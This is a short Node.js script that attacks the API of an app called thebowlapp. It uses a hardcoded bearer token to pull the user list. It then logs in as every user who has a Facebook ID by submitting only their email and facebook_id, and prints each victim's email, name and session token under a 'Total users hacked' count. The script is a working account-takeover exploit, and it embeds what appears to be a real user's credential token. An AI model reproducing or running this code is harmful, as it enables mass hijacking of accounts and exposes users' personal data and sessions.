import request from 'request-promise'
import colors from 'colors'

request('http://api.thebowlapp.com/api/get-user?search=', {
  method: 'GET',
  headers: {
    'Authorization': 'bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJfaWQiOiI1OGMwYjNlOTYyMjhmNjBkZGMxYjRjNDUiLCJlbWFpbCI6InNoYWN0LmRldmVsb3BlckBnbWFpbC5jb20iLCJmYWNlYm9va19pZCI6IjEwMDAxMDM0MjQ3NDY1NSIsInVzZXJuYW1lIjoic2hhY3QiLCJhZG1pbiI6ZmFsc2UsIl9fdiI6MCwiaWF0IjoxNDg5MDI0NDM2fQ.OAB00icccIMcZvKDATlCO2KOJnKCdVFF0b7N4hl6v38'
  },
  json: true
})
.then(data => data.response)
.then(response => response.user)
.then(users => {

  let hackedCount = 0

  const hackPromise = users.map(user => {
    const {
      email,
      facebook_id,
      first_name
    } = user

    if (facebook_id) {
      try {
        return request('http://api.thebowlapp.com/api/login', {
          method: 'POST',
          headers: {
            'Authorization': 'bearer null',
            'content-type' : 'application/x-www-form-urlencoded'
          },
          form: {
            email,
            facebook_id
          },
          json: true
        })
        .then(({ token }) => {
          console.log(`${colors.gray('email')}: ${colors.green(email)}`)
          console.log(`${colors.gray('name')}: ${colors.green(first_name)}`)
          console.log(`${colors.gray('token')}: ${colors.rainbow(token.slice(0, 10))}...${colors.rainbow(token.slice(-10))}`)
          hackedCount++
        })
      } catch (err) {
        console.error(err)
        return null
      }
    }
  })
  Promise.all(hackPromise)
  .then(() => {
    console.log(`${colors.red('Total users hacked:')} ${colors.gray(hackedCount)}`)
  })

})
